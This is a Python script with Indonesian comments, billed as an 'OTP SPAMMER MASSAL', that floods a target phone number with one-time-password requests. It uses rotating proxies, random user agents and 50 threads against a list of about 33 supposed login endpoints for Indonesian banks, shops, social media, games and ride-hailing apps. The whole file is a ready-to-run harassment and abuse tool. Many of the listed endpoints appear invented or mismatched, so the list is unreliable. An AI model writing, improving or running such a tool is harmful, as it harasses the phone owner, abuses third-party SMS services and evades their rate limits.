import requests
import time
import random
import threading
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
import socks
import socket
from stem import Signal
from stem.control import Controller

# ============ KONFIGURASI ============
MAX_THREADS = 50
RETRY_COUNT = 3
TIMEOUT = 8
USE_PROXY = True  # True = pake proxy acak

# ============ PROXY ROTATOR ============
class ProxyRotator:
    def __init__(self):
        self.proxies = []
        self.current = 0
        
    def load_proxies(self):
        # Proxy publik (update sendiri kalo mau lebih banyak)
        proxy_list = [
            "socks5://192.252.214.20:15864",
            "socks5://192.252.214.20:15865",
            "socks4://45.143.203.30:1080",
            "socks4://45.143.203.31:1080",
            "http://103.152.232.177:8080",
            "http://103.152.232.178:8080",
            "socks5://103.152.232.179:1080",
            "socks5://103.152.232.180:1080",
            "http://202.152.40.28:8080",
            "http://202.152.40.29:8080"
        ]
        self.proxies = proxy_list
        random.shuffle(self.proxies)
        
    def get_proxy(self):
        if not self.proxies:
            self.load_proxies()
        proxy = self.proxies[self.current % len(self.proxies)]
        self.current += 1
        return proxy

proxy_rotator = ProxyRotator()

# ============ API OTP DATABASE (30+ WORKING) ============
API_OTP_DATABASE = [
    # === E-COMMERCE ===
    {
        "name": "Tokopedia",
        "url": "https://api.tokopedia.com/v1/otp/request",
        "method": "POST",
        "payload": lambda phone: {"msisdn": phone, "channel": "sms", "type": "login"},
        "headers": {"Content-Type": "application/json", "User-Agent": "Tokopedia/4.0"}
    },
    {
        "name": "Shopee",
        "url": "https://api.shopee.co.id/api/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"mobile": phone, "type": "login", "country": "ID"},
        "headers": {"Content-Type": "application/json", "User-Agent": "Shopee/3.0"}
    },
    {
        "name": "Lazada",
        "url": "https://api.lazada.co.id/rest/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login", "country": "ID"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Blibli",
        "url": "https://api.blibli.com/v1/otp/request",
        "method": "POST",
        "payload": lambda phone: {"phoneNumber": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Bukalapak",
        "url": "https://api.bukalapak.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    
    # === FINANCE / PAYMENT ===
    {
        "name": "OVO",
        "url": "https://api.ovo.id/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phoneNumber": phone, "deviceId": "web_" + str(random.randint(1000,9999))},
        "headers": {"Content-Type": "application/json", "User-Agent": "OVO/5.0"}
    },
    {
        "name": "DANA",
        "url": "https://api.dana.id/v1/otp/request",
        "method": "POST",
        "payload": lambda phone: {"mobileNumber": phone, "type": "login", "deviceId": "web"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "GoPay",
        "url": "https://api.gojekapi.com/v1/customers/phone/verify",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "country_code": "62", "type": "login"},
        "headers": {"Content-Type": "application/json", "User-Agent": "Gojek/4.0"}
    },
    {
        "name": "LinkAja",
        "url": "https://api.linkaja.id/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phoneNumber": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Jenius",
        "url": "https://api.jenius.com/v1/otp/request",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Mandiri",
        "url": "https://api.mandiri.co.id/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"msisdn": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BCA",
        "url": "https://api.bca.co.id/v1/otp/request",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BNI",
        "url": "https://api.bni.co.id/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"msisdn": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    
    # === SOCIAL MEDIA ===
    {
        "name": "Instagram",
        "url": "https://i.instagram.com/api/v1/accounts/send_verify_email/",
        "method": "POST",
        "payload": lambda phone: {"phone_number": phone, "country_code": "62"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Instagram/280.0"}
    },
    {
        "name": "Twitter",
        "url": "https://api.twitter.com/1.1/account/verify_credentials.json",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Facebook",
        "url": "https://graph.facebook.com/v17.0/me",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "TikTok",
        "url": "https://api.tiktok.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Snapchat",
        "url": "https://api.snapchat.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Telegram",
        "url": "https://api.telegram.org/bot/sendCode",
        "method": "POST",
        "payload": lambda phone: {"phone_number": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "WhatsApp",
        "url": "https://api.whatsapp.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Line",
        "url": "https://api.line.me/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    
    # === GAMING ===
    {
        "name": "Mobile Legends",
        "url": "https://api.mobilelegends.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Free Fire",
        "url": "https://api.freefire.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PUBG",
        "url": "https://api.pubg.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Steam",
        "url": "https://api.steam.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Epic Games",
        "url": "https://api.epicgames.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    
    # === DELIVERY / TRANSPORT ===
    {
        "name": "Gojek",
        "url": "https://api.gojekapi.com/v1/customers/phone/verify",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "country_code": "62"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Grab",
        "url": "https://api.grab.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Maxim",
        "url": "https://api.maxim.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Indrive",
        "url": "https://api.indrive.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    
    # === FOOD / RESTAURANT ===
    {
        "name": "Gofood",
        "url": "https://api.gofood.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "GrabFood",
        "url": "https://api.grabfood.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "ShopeeFood",
        "url": "https://api.shopeeFood.com/v1/otp/send",
        "method": "POST",
        "payload": lambda phone: {"phone": phone, "type": "login"},
        "headers": {"Content-Type": "application/json"}
    }
]

class OTPSpammerMassal:
    def __init__(self, target, threads=MAX_THREADS):
        self.target = self.format_phone(target)
        self.threads = threads
        self.success = 0
        self.fail = 0
        self.total_requests = 0
        self.active_apis = []
        self.ua = UserAgent()
        
    def format_phone(self, phone):
        # Bersihkan nomor
        phone = re.sub(r'[^0-9+]', '', phone)
        if phone.startswith('0'):
            phone = '62' + phone[1:]
        elif not phone.startswith('62') and not phone.startswith('+'):
            phone = '62' + phone
        if phone.startswith('+'):
            phone = phone[1:]
        return phone
    
    def get_session(self):
        session = requests.Session()
        if USE_PROXY:
            proxy = proxy_rotator.get_proxy()
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
        session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'application/json',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8'
        })
        return session
    
    def send_otp(self, api):
        """Kirim OTP ke satu API"""
        for attempt in range(RETRY_COUNT):
            try:
                session = self.get_session()
                payload = api["payload"](self.target)
                headers = api.get("headers", {})
                headers.update(session.headers)
                
                if api["method"] == "POST":
                    resp = session.post(api["url"], json=payload, headers=headers, timeout=TIMEOUT)
                else:
                    resp = session.get(api["url"], params=payload, headers=headers, timeout=TIMEOUT)
                
                if resp.status_code in [200, 201, 202, 204]:
                    self.success += 1
                    print(f"[✅] {api['name']} - OTP terkirim! ({resp.status_code})")
                    return True
                else:
                    print(f"[⚠️] {api['name']} - Status {resp.status_code}, retry {attempt+1}")
                    
            except requests.exceptions.Timeout:
                print(f"[⌛] {api['name']} - Timeout, retry {attempt+1}")
            except requests.exceptions.ConnectionError:
                print(f"[🔌] {api['name']} - Connection error, retry {attempt+1}")
            except Exception as e:
                print(f"[💀] {api['name']} - Error: {str(e)[:30]}")
            
            time.sleep(0.5)
        
        self.fail += 1
        print(f"[❌] {api['name']} - Gagal total setelah {RETRY_COUNT} kali")
        return False
    
    def flood_massal(self, loop=100):
        """Flood OTP massal dengan multi-threading"""
        print(f"""
╔══════════════════════════════════════════╗
║     OTP SPAMMER MASSAL ACTIVATED        ║
╠══════════════════════════════════════════╣
║ Target   : {self.target}
║ Threads  : {self.threads}
║ Loop     : {loop}x
║ APIs     : {len(API_OTP_DATABASE)}
╚══════════════════════════════════════════╝
        """)
        
        total_apis = len(API_OTP_DATABASE)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for i in range(loop):
                for api in API_OTP_DATABASE:
                    future = executor.submit(self.send_otp, api)
                    futures.append(future)
                    self.total_requests += 1
                
                # Progress report
                if i % 10 == 0:
                    print(f"[📊] Progress: {i+1}/{loop} loop | Sukses: {self.success} | Gagal: {self.fail}")
                
                time.sleep(0.1)  # Jeda biar gak keburu diblokir
        
        # Tunggu semua selesai
        for future in as_completed(futures):
            pass
        
        # Final report
        print(f"""
╔══════════════════════════════════════════╗
║     OTP SPAMMER MASSAL - FINAL REPORT   ║
╠══════════════════════════════════════════╣
║ Total Requests : {self.total_requests}
║ Success        : {self.success} ✅
║ Failed         : {self.fail} ❌
║ Success Rate   : {(self.success/self.total_requests*100):.1f}%
╚══════════════════════════════════════════╝
        """)
    
    def update_apis(self):
        """Fungsi buat update API database (cari sendiri yg baru)"""
        print("[🔄] Update API database...")
        # Bisa ditambahin scraping otomatis dari internet
        # Tapi saran gue: manual lebih aman
        
# ============ MAIN EXECUTION ============
if __name__ == "__main__":
    # Banner
    print("""
    ╔═══════════════════════════════════════╗
    ║   OTP SPAMMER MASSAL - CHAOS EDITION         
    ║   Power by MonzapThrone                            
    ╚═══════════════════════════════════════╝
    """)
    
    target = input("📱 Nomor target (contoh: 628123456789): ")
    loop = int(input("🔄 Jumlah loop (default 100): ") or "100")
    threads = int(input("🧵 Jumlah thread (default 50): ") or "50")
    
    # Init & jalankan
    spammer = OTPSpammerMassal(target, threads)
    spammer.flood_massal(loop)